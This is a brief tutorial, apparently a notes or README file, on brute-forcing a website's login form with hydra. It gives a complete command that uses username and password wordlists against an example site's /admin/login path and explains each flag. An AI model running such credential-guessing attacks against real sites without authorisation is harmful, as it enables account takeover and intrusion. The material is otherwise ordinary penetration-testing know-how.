# Brute forcing a website using hydra

## Instructions
1. Get a wordlist (rockyou, wifite, etc)

2. Run the hydra command

## Using hydra in the terminal

### Example usage:
```
hydra -L ./user.txt -P ./wordlist.txt mysite.com https-post-form "/admin/login:username=^USER^&password=^PASS^:F=fail"
```

**Explanation**

`-L` - Define the username wordlist<br />
`-P` - Define the password woprdlist<br />
`mysite.com` - The domain to brute force<br />
`https-post-form` - The type of request to send, you can also use `http-post-form` for sites using `http` instead of `https`<br />
`/admin/login` - The path to the login page
`:username=^USER^` - The username parameter to send, `^USER^` for a dynamic username
`&password=^PASS^` - The password parameter to send, `^PASS^` for a dynamic password
`:F=fail` - The error message on a failed request



## Reference:
* https://xstag0.medium.com/brute-force-web-logins-57c9e24a1c84